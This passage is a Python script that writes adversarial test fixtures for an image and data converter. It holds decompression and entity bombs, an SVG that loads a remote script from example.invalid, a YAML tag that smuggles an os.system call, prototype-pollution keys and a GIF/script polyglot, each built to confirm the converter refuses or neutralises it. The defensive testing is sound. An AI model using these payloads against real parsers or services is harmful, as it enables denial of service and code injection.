#!/usr/bin/env python3
"""Writes the trap files: images that are broken, hostile, or lying, each in one deliberate way.

    fixtures/_tools/make-traps.py

Output goes to fixtures/_traps/, with manifest.json saying what every file is and what must
happen to it. Both test suites read that manifest (fixtures/traps.test.ts in Node,
e2e/traps.spec.ts in three browsers), so adding a trap here is all it takes to have it run.

Everything is built byte by byte with the standard library, and is deterministic: running this
twice writes identical files.
"""
import json
import os
import random
import struct
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
FIXTURES = os.path.dirname(HERE)
OUT = os.path.join(FIXTURES, "_traps")
SIGNATURE = b"\x89PNG\r\n\x1a\n"

manifest = []


# --- PNG building blocks ------------------------------------------------------------------------
def chunk(kind: bytes, data: bytes, crc: int | None = None, length: int | None = None) -> bytes:
    real_crc = zlib.crc32(kind + data) & 0xFFFFFFFF
    return (
        struct.pack(">I", len(data) if length is None else length)
        + kind
        + data
        + struct.pack(">I", real_crc if crc is None else crc)
    )


def ihdr(width, height, depth=8, colour=6, interlace=0) -> bytes:
    return chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, depth, colour, 0, 0, interlace))


def idat(raw: bytes) -> bytes:
    return chunk(b"IDAT", zlib.compress(raw, 9))


IEND = chunk(b"IEND", b"")


def rgba_rows(width, height, rows=None) -> bytes:
    """Scanlines for an 8-bit RGBA picture: a gradient with a transparent corner."""
    raw = bytearray()
    for y in range(height if rows is None else rows):
        raw.append(0)
        for x in range(width):
            alpha = 0 if (x < width // 4 and y < height // 4) else 255
            raw += bytes((255 * x // max(1, width - 1), 255 * y // max(1, height - 1), 160, alpha))
    return bytes(raw)


W, H = 256, 160
GOOD = SIGNATURE + ihdr(W, H) + idat(rgba_rows(W, H)) + IEND


# --- manifest ---------------------------------------------------------------------------------
def trap(name, data, why, detect, guard="ok", node="none", browser=None, mismatch=False, group="", note=None, absent=None):
    """
    detect   what identification must say: a format id, 'unregistered', or 'unknown'
    guard    'refused' if the size and pixel guard must stop it before any decode
    node     what libvips in Node must do with it: 'fails', 'succeeds', or 'none' (never reached)
    browser  the same for the app in a browser. Defaults to the Node expectation, and no trap
             differs: a PNG's structure is verified before a browser's own decoder is allowed
             near it, so a forgiving decoder never gets the chance to return half a picture.
    note     the exact reason the app must show, where a generic one will not do
    absent   text that must not appear anywhere in the converted file (a payload hidden in the
             input's metadata, which a conversion must not carry across)
    """
    with open(os.path.join(OUT, name), "wb") as out:
        out.write(data)
    manifest.append(
        {
            "file": name,
            "group": group,
            "why": why,
            "detect": detect,
            "mismatch": mismatch,
            "guard": guard,
            "node": node,
            "browser": node if browser is None else browser,
            "note": note,
            "absent": absent,
        }
    )


def read(*parts) -> bytes:
    with open(os.path.join(FIXTURES, *parts), "rb") as source:
        return source.read()


os.makedirs(OUT, exist_ok=True)
for stale in os.listdir(OUT):
    if stale != "README.md":
        os.remove(os.path.join(OUT, stale))

# === 1. Files that are not what they say ============================================================
G = "identity"
trap("empty.png", b"", "Zero bytes.", "unknown", group=G)
trap("text.png", b"This is a text file, not an image.\n", "Plain text with an image name.", "unknown", group=G)
trap(
    "random-bytes.png",
    random.Random(20261122).randbytes(4096),
    "4 KB of noise: no signature of any kind.",
    "unknown",
    group=G,
)
trap(
    "svg-with-script.png",
    b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>alert(1)</script></svg>\n',
    "An SVG carrying a script, named as a PNG. It is drawn as the SVG it is, and the script is "
    "never run.",
    "svg",
    node="succeeds",
    mismatch=True,
    group=G,
)
trap(
    "jpeg-named.png",
    read("jpeg", "sample.jpg"),
    "A real JPEG with a .png name. The contents win over the name, and it converts as a JPEG.",
    "jpeg",
    node="succeeds",
    mismatch=True,
    group=G,
)
trap(
    "webp-named.png",
    read("webp", "sample.webp"),
    "A real WebP with a .png name. It converts as the WebP it is.",
    "webp",
    node="succeeds",
    mismatch=True,
    group=G,
)
trap(
    "gif-named.png",
    read("gif", "sample.gif"),
    "A real GIF with a .png name. It converts as the GIF it is.",
    "gif",
    node="succeeds",
    mismatch=True,
    group=G,
)
trap(
    "png-named.jpg",
    GOOD,
    "A sound PNG with a .jpg name. It must convert as the PNG it is.",
    "png",
    node="succeeds",
    mismatch=True,
    group=G,
)

# === 2. Files that lie about their size ============================================================
G = "size"
bmp_huge = bytearray(read("bmp", "sample.bmp"))
bmp_huge[18:26] = struct.pack("<ii", 50000, 50000)
trap(
    "huge-declared.bmp",
    bytes(bmp_huge),
    "A small BMP whose header states 50,000 pixels a side. Refused from the header.",
    "bmp",
    guard="refused",
    group=G,
)
trap(
    "huge-declared.qoi",
    b"qoif" + struct.pack(">II", 50000, 50000) + bytes([4, 0]) + bytes(7) + b"\x01",
    "Twenty-two bytes of QOI that state 50,000 pixels a side. Refused from the header.",
    "qoi",
    guard="refused",
    group=G,
)
psd_huge = bytearray(read("psd", "sample.psd"))
psd_huge[14:22] = struct.pack(">II", 300000, 300000)
trap(
    "huge-declared.psd",
    bytes(psd_huge),
    "A Photoshop file whose header states 300,000 pixels a side, ten times what the format allows.",
    "psd",
    guard="refused",
    group=G,
)
trap(
    "huge-declared.pnm",
    b"P6\n# a comment\n50000 50000\n255\n" + bytes(64),
    "Thirty bytes of Netpbm text that state 50,000 pixels a side. Refused from the header.",
    "pnm",
    guard="refused",
    group=G,
)
tga_huge = bytearray(read("tga", "sample.tga"))
tga_huge[12:16] = struct.pack("<HH", 65535, 65535)
trap(
    "huge-declared.tga",
    bytes(tga_huge),
    "A small TGA whose header states 65,535 pixels a side, the most the format can say.",
    "tga",
    guard="refused",
    group=G,
)
trap(
    "huge-declared.svg",
    b'<svg xmlns="http://www.w3.org/2000/svg" width="200000" height="200000"><rect width="10" height="10"/></svg>\n',
    "A hundred bytes of SVG that state a size of forty thousand megapixels. Refused from the "
    "stated size, before anything is drawn.",
    "svg",
    guard="refused",
    group=G,
)
trap(
    "declares-30000x30000.png",
    SIGNATURE + ihdr(30000, 30000),
    "33 bytes. The header claims 900 megapixels; there are no pixels at all.",
    "png",
    guard="refused",
    group=G,
)
trap(
    "declares-max-size.png",
    SIGNATURE + ihdr(0xFFFFFFFF, 0xFFFFFFFF),
    "The header claims the largest size a PNG header can express.",
    "png",
    guard="refused",
    group=G,
)
trap(
    "declares-zero-size.png",
    SIGNATURE + ihdr(0, 0) + idat(b"") + IEND,
    "The header claims 0 x 0.",
    "png",
    node="fails",
    group=G,
)
# A genuine decompression bomb: a valid, complete, 49 KB file that decodes to 400 megapixels.
# One bit a pixel, all zero, so it deflates to almost nothing; as RGBA it would need 1.6 GB.
BOMB = 20000
bomb_row = b"\x00" + bytes(BOMB // 8)
squeeze = zlib.compressobj(9)
bomb_data = b"".join(squeeze.compress(bomb_row) for _ in range(BOMB)) + squeeze.flush()
trap(
    "bomb-20000x20000.png",
    SIGNATURE + ihdr(BOMB, BOMB, depth=1, colour=0) + chunk(b"IDAT", bomb_data) + IEND,
    "A real decompression bomb: a valid file of a few kilobytes that decodes to 400 megapixels. "
    "It must be refused from its header, never decoded.",
    "png",
    guard="refused",
    group=G,
)
trap(
    "too-wide-for-webp.png",
    SIGNATURE + ihdr(20000, 8) + idat((b"\x00" + bytes(20000 * 4)) * 8) + IEND,
    "A valid, small picture 20000 pixels wide. WebP cannot hold anything wider than 16383. "
    "Chrome's encoder quietly returns a 16383-pixel picture instead of failing, so the app must "
    "refuse first and say why.",
    "png",
    node="fails",
    note="Too large for WebP, which holds 16383 pixels a side at most",
    group=G,
)

# === 3. Files that start well and go wrong ==========================================================
G = "damage"
trap(
    "signature-only.png",
    SIGNATURE,
    "The eight-byte PNG signature and nothing after it. Too little to call a PNG.",
    "unknown",
    group=G,
)
trap(
    "truncated.png",
    GOOD[: len(GOOD) * 6 // 10],
    "A sound PNG cut off 60% of the way through.",
    "png",
    node="fails",
    group=G,
)
trap(
    "no-image-data.png",
    SIGNATURE + ihdr(W, H) + IEND,
    "A header and an end marker with no image data between them.",
    "png",
    node="fails",
    group=G,
)
trap(
    "short-image-data.png",
    SIGNATURE + ihdr(W, H) + idat(rgba_rows(W, H, rows=H // 2)) + IEND,
    "Well-formed, but holds only half the rows its header promises.",
    "png",
    node="fails",
    group=G,
)
good_idat = zlib.compress(rgba_rows(W, H), 9)
broken = bytearray(good_idat)
broken[len(broken) // 3 : len(broken) // 3 + 64] = b"\xff" * 64
trap(
    "corrupt-image-data.png",
    SIGNATURE + ihdr(W, H) + chunk(b"IDAT", bytes(broken)) + IEND,
    "The compressed image data is overwritten part-way through. The checksum is correct, so only "
    "decompressing it reveals the damage.",
    "png",
    node="fails",
    group=G,
)
trap(
    "bad-checksum.png",
    SIGNATURE + ihdr(W, H) + chunk(b"IDAT", good_idat, crc=0xDEADBEEF) + IEND,
    "The image data is intact but its checksum is wrong.",
    "png",
    node="fails",
    group=G,
)
trap(
    "bad-bit-depth.png",
    SIGNATURE + ihdr(W, H, depth=3) + idat(rgba_rows(W, H)) + IEND,
    "The header declares a bit depth (3) that PNG does not allow.",
    "png",
    node="fails",
    group=G,
)
trap(
    "bad-colour-type.png",
    SIGNATURE + ihdr(W, H, colour=9) + idat(rgba_rows(W, H)) + IEND,
    "The header declares a colour type (9) that does not exist.",
    "png",
    node="fails",
    group=G,
)
bad_filter = bytearray(rgba_rows(W, H))
for row in range(H):
    bad_filter[row * (W * 4 + 1)] = 9
trap(
    "bad-filter-type.png",
    SIGNATURE + ihdr(W, H) + idat(bytes(bad_filter)) + IEND,
    "Every row is marked with a filter type (9) that does not exist.",
    "png",
    node="fails",
    group=G,
)
trap(
    "chunk-length-overflow.png",
    SIGNATURE + ihdr(W, H) + chunk(b"IDAT", good_idat[:64], length=0xFFFFFFF0) + IEND,
    "A chunk claims to be four gigabytes long. A reader that trusts it reads past the end. "
    "Identification runs off the end of the file looking for the next chunk and gives up.",
    "unknown",
    group=G,
)
trap(
    "header-not-first.png",
    SIGNATURE + idat(rgba_rows(W, H)) + ihdr(W, H) + IEND,
    "The image data comes before the header that describes it.",
    "png",
    node="fails",
    group=G,
)
trap(
    "metadata-bomb.png",
    SIGNATURE
    + ihdr(W, H)
    + chunk(b"zTXt", b"Comment\x00\x00" + zlib.compress(bytes(50 * 1024 * 1024), 9))
    + idat(rgba_rows(W, H))
    + IEND,
    "A sound picture carrying a compressed comment that expands to 50 MB. The picture must "
    "convert without the comment being inflated into memory to no purpose.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "no-end-marker.png",
    SIGNATURE + ihdr(W, H) + idat(rgba_rows(W, H)),
    "Complete image data, but the file stops before the end marker. Every decoder accepts it.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "trailing-garbage.png",
    GOOD + random.Random(7).randbytes(10000),
    "A sound PNG followed by 10 KB of noise. The picture is whole; the tail must be ignored.",
    "png",
    node="succeeds",
    group=G,
)

# AVIF and JPEG XL, read by libvips's optional modules. Each must refuse what is damaged too.
for folder, ext, label in (("avif", "avif", "AVIF"), ("jxl", "jxl", "JPEG XL")):
    sound = read(folder, f"sample.{ext}")
    trap(
        f"truncated.{ext}",
        sound[: len(sound) // 2],
        f"A sound {label} file cut off halfway through.",
        ext,
        node="fails",
        group=G,
    )
    flipped = bytearray(sound)
    for i in range(len(flipped) - 400, len(flipped) - 300):
        flipped[i] ^= 0xFF
    trap(
        f"corrupt-data.{ext}",
        bytes(flipped),
        f"A sound {label} file with a hundred bytes of its picture data inverted.",
        ext,
        node="fails",
        group=G,
    )

# HEIC, decoded by libheif. A file cut short is refused. One whose compressed data is altered is
# not always: HEVC carries no checksum, so the decoder cannot tell, and returns a damaged picture.
heic_sound = read("heic", "sample.heic")
trap(
    "truncated.heic",
    heic_sound[: len(heic_sound) // 2],
    "A sound HEIC file cut off halfway through.",
    "heic",
    node="fails",
    group=G,
)

# The formats ImageMagick reads. Each is cut off halfway; each must be refused, not half-drawn.
for folder, ext, label in (
    ("bmp", "bmp", "BMP"),
    ("qoi", "qoi", "QOI"),
    ("psd", "psd", "Photoshop"),
    ("ico", "ico", "icon"),
    ("jp2", "jp2", "JPEG 2000"),
):
    sound = read(folder, f"sample.{ext}")
    trap(
        f"truncated.{ext}",
        sound[: len(sound) // 2],
        f"A sound {label} file cut off halfway through.",
        ext,
        node="fails",
        group=G,
    )
for folder, name, ext, label in (
    ("tga", "sample.tga", "tga", "TGA"),
    ("pnm", "sample.ppm", "pnm", "Netpbm"),
    ("pcx", "sample.pcx", "pcx", "PCX"),
    ("sgi", "sample.sgi", "sgi", "SGI"),
    ("ras", "sample.ras", "ras", "Sun Raster"),
    ("hdr", "sample.hdr", "hdr", "Radiance HDR"),
    ("exr", "sample.exr", "exr", "OpenEXR"),
    ("svgz", "sample.svgz", "svgz", "SVGZ"),
):
    sound = read(folder, name)
    trap(
        f"truncated.{name.split('.')[1]}",
        sound[: len(sound) // 2],
        f"A sound {label} file cut off halfway through.",
        ext,
        node="fails",
        group=G,
    )


def gzip_bytes(parts) -> bytes:
    """Gzip, with no name or time in the header, so the file is the same on every run."""
    squeeze = zlib.compressobj(9, zlib.DEFLATED, 31)
    return b"".join(squeeze.compress(part) for part in parts) + squeeze.flush()


trap(
    "gzip-bomb.svgz",
    gzip_bytes(
        [b'<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">']
        + [b" " * (1 << 20)] * 256
        + [b"</svg>\n"]
    ),
    "A quarter of a megabyte that unpacks to a quarter of a gigabyte of spaces inside an SVG. "
    "Unpacking must stop at a limit, and the file be refused.",
    "svgz",
    node="fails",
    group=G,
)
trap(
    "gzip-of-text.svgz",
    gzip_bytes([b"Not a drawing, only some text that has been compressed.\n"]),
    "A gzip file with an .svgz name that does not hold an SVG. It is a gzip file, and no more.",
    "unregistered",
    group=G,
)
ico_sound = bytearray(read("ico", "sample.ico"))
ico_sound[18:22] = struct.pack("<I", 0x7FFFFFF0)  # where the first picture is said to start
trap(
    "bad-offset.ico",
    bytes(ico_sound),
    "An icon whose directory points two gigabytes past the end of the file for its picture.",
    "ico",
    node="fails",
    group=G,
)

# SVG, drawn by resvg. It is text, so the ways it goes wrong are a parser's.
SVG_OPEN = b'<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">'
trap(
    "unclosed.svg",
    SVG_OPEN + b'<rect width="10" height="10"',
    "An SVG that stops in the middle of a tag.",
    "svg",
    node="fails",
    group=G,
)
use_bomb = b'<g id="a0"><rect width="1" height="1"/></g>'
for level in range(1, 9):
    use_bomb += f'<g id="a{level}">'.encode() + f'<use href="#a{level - 1}"/>'.encode() * 10 + b"</g>"
trap(
    "use-bomb.svg",
    SVG_OPEN + b"<defs>" + use_bomb + b'</defs><use href="#a8"/></svg>\n',
    "A few hundred bytes of shapes that each draw the one before ten times: a hundred million "
    "rectangles if followed. The reader must stop counting and refuse.",
    "svg",
    node="fails",
    group=G,
)
trap(
    "self-reference.svg",
    SVG_OPEN + b'<g id="x"><rect width="8" height="8"/><use href="#x"/></g></svg>\n',
    "A shape that draws itself. The reader must break the loop, not follow it.",
    "svg",
    node="succeeds",
    group=G,
)
trap(
    "html-named.svg",
    b"<!DOCTYPE html>\n<html><body><svg></svg><script>alert(1)</script></body></html>\n",
    "A web page with an .svg name. Its root is not <svg>, so it is not an SVG: it is a web "
    "page, and one with a script and no words in it.",
    "html",
    node="fails",
    mismatch=True,
    note="This file has no text in it to convert",
    group=G,
)

# === 4. Sound files in shapes a careless reader gets wrong ============================================
G = "unusual"
deep = bytearray()
for y in range(40):
    deep.append(0)
    for x in range(64):
        deep += struct.pack(">HHHH", 65535 * x // 63, 65535 * y // 39, 40000, 65535)
trap(
    "sixteen-bit.png",
    SIGNATURE + ihdr(64, 40, depth=16) + idat(bytes(deep)) + IEND,
    "Valid, 16 bits a channel.",
    "png",
    node="succeeds",
    group=G,
)
indexed = bytearray()
for y in range(40):
    indexed.append(0)
    indexed += bytes((x // 16 + y // 10) % 4 for x in range(64))
trap(
    "palette-with-transparency.png",
    SIGNATURE
    + ihdr(64, 40, colour=3)
    + chunk(b"PLTE", bytes((59, 108, 255, 244, 244, 242, 13, 13, 13, 255, 0, 0)))
    + chunk(b"tRNS", bytes((255, 255, 255, 0)))
    + idat(bytes(indexed))
    + IEND,
    "Valid, four-colour palette, one colour fully transparent.",
    "png",
    node="succeeds",
    group=G,
)
bits = bytearray()
for y in range(40):
    bits.append(0)
    bits += bytes(0b10101010 if y % 2 else 0b01010101 for _ in range(8))
trap(
    "one-bit-grey.png",
    SIGNATURE + ihdr(64, 40, depth=1, colour=0) + idat(bytes(bits)) + IEND,
    "Valid, one bit a pixel.",
    "png",
    node="succeeds",
    group=G,
)


# ================================================================================================
# Second batch: adversarial files. Each reproduces the *shape* of an attack on an image reader
# (resource exhaustion, an index or length that points outside its table, a payload smuggled in
# metadata, a file that is two formats at once) without containing anything harmful itself.
# ================================================================================================

SMALL_W, SMALL_H = 64, 40
SMALL = rgba_rows(SMALL_W, SMALL_H)
PAYLOAD = "OMSETT-TRAP-PAYLOAD"

# --- more files that are not what they say --------------------------------------------------------
G = "identity"
trap(
    "gif-header-then-script.png",
    b"GIF89a" + b"/*" + bytes(20) + b"*/=1;<script>alert(1)</script>",
    "The classic two-in-one: bytes that open like a GIF and continue as a script. Identified as "
    "the GIF it opens as, refused as a broken one, and never run.",
    "gif",
    node="fails",
    mismatch=True,
    group=G,
)
trap(
    "entity-expansion.svg",
    b'<?xml version="1.0"?>\n<!DOCTYPE lolz [<!ENTITY a "aaaaaaaaaa">'
    + b"".join(
        f'<!ENTITY {chr(98 + i)} "{("&" + chr(97 + i) + ";") * 10}">'.encode() for i in range(8)
    )
    + b']>\n<svg xmlns="http://www.w3.org/2000/svg"><text>&i;</text></svg>\n',
    "An XML entity bomb (\"billion laughs\"): a kilobyte that expands to a gigabyte of text if "
    "parsed. The SVG reader must notice the loop and refuse.",
    "svg",
    node="fails",
    group=G,
)
trap(
    "svg-fetches-elsewhere.svg",
    b'<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40">'
    b'<image xlink:href="https://example.invalid/track.png" width="1" height="1"/>'
    b'<script xlink:href="https://example.invalid/x.js"/></svg>\n',
    "An SVG that asks for a picture and a script from another site. It is drawn without them, "
    "and nothing may be requested.",
    "svg",
    node="succeeds",
    group=G,
)
trap(
    "utf16-text.png",
    "﻿This is text in UTF-16, with a byte-order mark.\n".encode("utf-16"),
    "Text in an encoding whose first bytes can be mistaken for a binary signature.",
    "unknown",
    group=G,
)
trap(
    "png-then-zip.png",
    GOOD + b"PK\x03\x04" + bytes(26) + b"PK\x05\x06" + bytes(18),
    "A sound PNG with a ZIP archive attached to its end: one file, two formats. It is the PNG "
    "it opens as, and only the picture is converted.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "script-in-metadata.png",
    SIGNATURE
    + ihdr(SMALL_W, SMALL_H)
    + chunk(b"tEXt", b"Comment\x00<script>alert('" + PAYLOAD.encode() + b"')</script>")
    + chunk(
        b"iTXt",
        b"XML:com.adobe.xmp\x00\x00\x00\x00\x00"
        + b'<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
        b'<rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:creator>'
        + PAYLOAD.encode()
        + b"</dc:creator></rdf:Description></rdf:RDF></x:xmpmeta>",
    )
    + chunk(
        b"eXIf",
        b"MM\x00\x2a\x00\x00\x00\x08\x00\x01\x01\x0e\x00\x02"
        + struct.pack(">II", len(PAYLOAD) + 1, 26)
        + bytes(4)
        + PAYLOAD.encode()
        + b"\x00",
    )
    + idat(SMALL)
    + IEND,
    "A sound picture whose comment, XMP and EXIF metadata all carry a marked payload, one of "
    "them a script. The picture converts; none of the payload may reach the output, whichever "
    "engine does the work.",
    "png",
    node="succeeds",
    absent=PAYLOAD,
    group=G,
)

# --- more files that lie about their size ----------------------------------------------------------
G = "size"
trap(
    "rowbytes-overflow.png",
    SIGNATURE + ihdr(0x40000000, 1, depth=16),
    "One row, a billion pixels wide at 16 bits a channel: eight gigabytes for a single row, a "
    "size that overflows the 32-bit arithmetic older readers used for it.",
    "png",
    guard="refused",
    group=G,
)
trap(
    "sign-bit-size.png",
    SIGNATURE + ihdr(0x80000000, 0x80000000),
    "A width and height with the top bit set, which a reader that treats them as signed numbers "
    "sees as negative.",
    "png",
    guard="refused",
    group=G,
)
tall = 100000
squeeze = zlib.compressobj(9)
tall_data = b"".join(squeeze.compress(b"\x00\x00") for _ in range(tall)) + squeeze.flush()
trap(
    "tall-1x100000.png",
    SIGNATURE + ihdr(1, tall, depth=1, colour=0) + chunk(b"IDAT", tall_data) + IEND,
    "Valid, one pixel wide and a hundred thousand tall. Tiny in pixels, so the size guard lets "
    "it through; far taller than WebP can hold, so the target must refuse it.",
    "png",
    node="fails",
    note="Too large for WebP, which holds 16383 pixels a side at most",
    group=G,
)
big = 8000
big_row = b"\x00" + bytes(big // 8)
squeeze = zlib.compressobj(9)
big_data = b"".join(squeeze.compress(big_row) for _ in range(big)) + squeeze.flush()
trap(
    "large-8000x8000.png",
    SIGNATURE + ihdr(big, big, depth=1, colour=0) + chunk(b"IDAT", big_data) + IEND,
    "Valid and genuinely large: 64 megapixels in a file of a few kilobytes. Allowed by the guard "
    "and too big for the canvas engine, so it must be handed to libvips and convert, without "
    "the tab running out of memory.",
    "png",
    node="succeeds",
    group=G,
)

# --- more damage: the shapes that have broken image readers before ---------------------------------
G = "damage"
bad_adler = bytearray(zlib.compress(SMALL, 9))
bad_adler[-4:] = b"\xde\xad\xbe\xef"
trap(
    "inner-checksum-wrong.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + chunk(b"IDAT", bytes(bad_adler)) + IEND,
    "The outer checksum is right; the one inside the compressed data, which is only checked "
    "after everything has been decompressed, is wrong.",
    "png",
    node="fails",
    group=G,
)
trap(
    "too-much-image-data.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + idat(SMALL + SMALL) + IEND,
    "Twice as many rows as the header declares. A reader that writes what it is given, instead "
    "of what it allocated for, writes past the end of its buffer.",
    "png",
    node="succeeds",
    group=G,
)
out_of_range = b"".join(b"\x00" + bytes([200]) * SMALL_W for _ in range(SMALL_H))
trap(
    "palette-index-out-of-range.png",
    SIGNATURE
    + ihdr(SMALL_W, SMALL_H, colour=3)
    + chunk(b"PLTE", bytes((255, 0, 0, 0, 0, 255)))
    + idat(out_of_range)
    + IEND,
    "A two-colour palette, and pixels that all ask for colour number 200. A reader that looks "
    "it up without checking reads memory that is not the palette.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "palette-wrong-length.png",
    SIGNATURE
    + ihdr(SMALL_W, SMALL_H, colour=3)
    + chunk(b"PLTE", bytes((255, 0, 0, 0, 0, 255, 7)))
    + idat(b"".join(b"\x00" + bytes(SMALL_W) for _ in range(SMALL_H)))
    + IEND,
    "A palette of seven bytes. Colours take three bytes each, so the last one is cut short.",
    "png",
    node="fails",
    group=G,
)
trap(
    "transparency-longer-than-palette.png",
    SIGNATURE
    + ihdr(SMALL_W, SMALL_H, colour=3)
    + chunk(b"PLTE", bytes((255, 0, 0, 0, 0, 255)))
    + chunk(b"tRNS", bytes(256))
    + idat(b"".join(b"\x00" + bytes(SMALL_W) for _ in range(SMALL_H)))
    + IEND,
    "Two colours in the palette, and 256 transparency entries for them.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "unknown-critical-chunk.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + chunk(b"CRIT", b"must be understood") + idat(SMALL) + IEND,
    "Contains a chunk marked as essential that no reader knows. The format says a reader that "
    "does not understand an essential chunk must give up.",
    "png",
    node="fails",
    group=G,
)
trap(
    "interlace-flag-lies.png",
    SIGNATURE
    + chunk(b"IHDR", struct.pack(">IIBBBBB", SMALL_W, SMALL_H, 8, 6, 0, 0, 1))
    + idat(SMALL)
    + IEND,
    "The header says the rows are interlaced; the data is laid out as if they were not.",
    "png",
    node="fails",
    group=G,
)
trap(
    "colour-profile-bomb.png",
    SIGNATURE
    + ihdr(SMALL_W, SMALL_H)
    + chunk(b"iCCP", b"bomb\x00\x00" + zlib.compress(bytes(64 * 1024 * 1024), 9))
    + idat(SMALL)
    + IEND,
    "A sound picture with a colour profile that expands to 64 MB of nothing. Unlike a comment, "
    "a profile is something a reader wants to load.",
    "png",
    node="succeeds",
    group=G,
)
whole = zlib.compress(SMALL, 9)
trap(
    "image-data-in-single-bytes.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + b"".join(chunk(b"IDAT", whole[i : i + 1]) for i in range(len(whole))) + IEND,
    "Valid, with the image data split into one chunk per byte: thousands of chunks, each with "
    "its own header and checksum, to make a reader do a great deal of work for very little.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "five-thousand-comments.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + b"".join(chunk(b"tEXt", b"k%04d\x00v" % i) for i in range(5000)) + idat(SMALL) + IEND,
    "Valid, with five thousand comments ahead of the picture.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "zero-gamma.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + chunk(b"gAMA", struct.pack(">I", 0)) + idat(SMALL) + IEND,
    "Declares a gamma of zero, which a reader that applies it divides by.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "claims-a-million-frames.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + chunk(b"acTL", struct.pack(">II", 1_000_000, 0)) + idat(SMALL) + IEND,
    "Announces itself as an animation of a million frames and contains one picture. A reader "
    "that allocates per announced frame runs out of memory.",
    "png",
    node="succeeds",
    group=G,
)

# --- one more sound file a careless reader gets wrong ----------------------------------------------
G = "unusual"


def adam7(width, height):
    """The same gradient as rgba_rows, laid out in the seven passes of an interlaced PNG."""
    raw = bytearray()
    passes = ((0, 0, 8, 8), (4, 0, 8, 8), (0, 4, 4, 8), (2, 0, 4, 4), (0, 2, 2, 4), (1, 0, 2, 2), (0, 1, 1, 2))
    for x0, y0, dx, dy in passes:
        if x0 >= width:
            continue
        for y in range(y0, height, dy):
            raw.append(0)
            for x in range(x0, width, dx):
                raw += bytes((255 * x // max(1, width - 1), 255 * y // max(1, height - 1), 160, 255))
    return bytes(raw)


trap(
    "interlaced.png",
    SIGNATURE
    + chunk(b"IHDR", struct.pack(">IIBBBBB", SMALL_W, SMALL_H, 8, 6, 0, 0, 1))
    + idat(adam7(SMALL_W, SMALL_H))
    + IEND,
    "Valid, with its rows interlaced in seven passes, the way PNGs were saved for slow "
    "connections.",
    "png",
    node="succeeds",
    group=G,
)

# --- data: JSON, YAML, TOML, XML, CSV ---------------------------------------------------------
# These are text, read by parsers. What goes wrong is a parser's trouble: input that never
# ends, input that grows when read, input that asks to be run, and names that mean something
# to the language doing the reading. Each is converted to JSON (a JSON file, to YAML).
G = "data"

trap(
    "truncated.json",
    b'[\n  {"id": 1, "name": "Ada"},\n  {"id": 2, "name": ',
    "A JSON file that stops in the middle of a value, as a download cut short does.",
    "json",
    node="fails",
    note="This file is not valid JSON",
    group=G,
)
trap(
    "nested-300-deep.json",
    b"[" * 300 + b"]" * 300 + b"\n",
    "Three hundred lists, each inside the last. Valid, and far deeper than anything written "
    "by hand; much deeper and whatever walks it runs out of stack.",
    "json",
    node="fails",
    note="The values in this file are nested too deeply",
    group=G,
)
trap(
    "proto-names.json",
    b'{\n  "__proto__": {"polluted": true},\n  "constructor": {"prototype": {"polluted": true}},\n'
    b'  "toString": "not a function",\n  "rows": [1, 2, 3]\n}\n',
    "Names that mean something to JavaScript. A careless reader lets them change how every "
    "object in the program behaves; here they are only names.",
    "json",
    node="succeeds",
    group=G,
)
trap(
    "byte-order-mark.json",
    b'\xef\xbb\xbf{"name": "Ada", "born": 1815}\n',
    "Valid JSON behind the three invisible bytes some Windows programs put at the start of a "
    "text file.",
    "json",
    node="succeeds",
    group=G,
)
trap(
    "utf-16.json",
    '{"name": "Ada"}\n'.encode("utf-16"),
    "JSON saved as UTF-16, two bytes to a character. These formats are read as UTF-8 only, so "
    "this is not recognised as text at all.",
    "unknown",
    group=G,
)

alias_bomb = "a: &a [x, x, x, x, x, x, x, x, x]\n"
for i, name in enumerate("bcdefghi"):
    previous = "a" if i == 0 else "bcdefghi"[i - 1]
    alias_bomb += f"{name}: &{name} [{', '.join(['*' + previous] * 9)}]\n"
trap(
    "alias-bomb.yaml",
    alias_bomb.encode(),
    'The "billion laughs": nine short lists, each made of nine copies of the one before. Under '
    "a kilobyte as written, hundreds of millions of values if every copy is followed.",
    "yaml",
    node="fails",
    note="This file is not valid YAML",
    group=G,
)
trap(
    "asks-to-run-code.yaml",
    b'run: !!python/object/apply:os.system ["echo owned"]\n'
    b'call: !!js/function "function () { return 1 }"\n'
    b"plain: stays\n",
    "Tags that, in a careless reader, build objects or call functions as the file is read. "
    "Here a tag builds nothing, and what it was attached to is kept as text.",
    "yaml",
    node="succeeds",
    group=G,
)
trap(
    "unclosed-list.yaml",
    b"name: Ada\nfields: [mathematics, computing\nborn: 1815\n",
    "A list that is opened and never closed.",
    "yaml",
    node="fails",
    note="This file is not valid YAML",
    group=G,
)

trap(
    "same-name-twice.toml",
    b'name = "Ada"\nname = "Grace"\n',
    "One name given two values, which TOML forbids. A reader that quietly keeps one of them "
    "has thrown data away without saying so.",
    "toml",
    node="fails",
    note="This file is not valid TOML",
    group=G,
)
trap(
    "unfinished-text.toml",
    b'title = "People"\nnote = "never closed\n',
    "A quoted value with no closing quote.",
    "toml",
    node="fails",
    note="This file is not valid TOML",
    group=G,
)

xml_entities = b'<!ENTITY a0 "aaaaaaaaaa">'
for i in range(1, 9):
